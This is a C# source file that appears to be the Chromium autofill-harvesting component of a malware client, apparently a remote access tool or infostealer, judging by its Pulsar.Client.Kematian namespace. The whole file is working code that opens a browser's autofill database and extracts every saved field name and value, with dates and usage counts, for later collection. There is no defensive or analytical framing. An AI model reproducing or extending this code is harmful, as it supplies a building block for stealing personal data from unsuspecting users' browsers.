﻿using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Chromium.Autofill
{
    public class Autofill
    {
        public static List<AutoFillData> GetAutofillEntries(string database)
        {
            var entries = new List<AutoFillData>();

            if (File.Exists(database))
            {
                SQLiteHandler sqlDatabase;

                try
                {
                    sqlDatabase = new SQLiteHandler(database);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                    return entries;
                }

                if (!sqlDatabase.ReadTable("autofill"))
                {
                    Debug.WriteLine("Failed to read 'autofill' table from database.");
                    return entries;
                }

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var name = sqlDatabase.GetValue(i, "name");
                        var value = sqlDatabase.GetValue(i, "value");
                        var valueLower = sqlDatabase.GetValue(i, "value_lower");
                        var dateCreated = sqlDatabase.GetValue(i, "date_created");
                        var dateLastUsed = sqlDatabase.GetValue(i, "date_last_used");
                        var count = sqlDatabase.GetValue(i, "count");

                        entries.Add(new AutoFillData(name, value, valueLower, dateCreated, dateLastUsed, count));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to retrieve Autofill data from database: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("Database file not found.");
            }

            return entries;
        }
    }
}
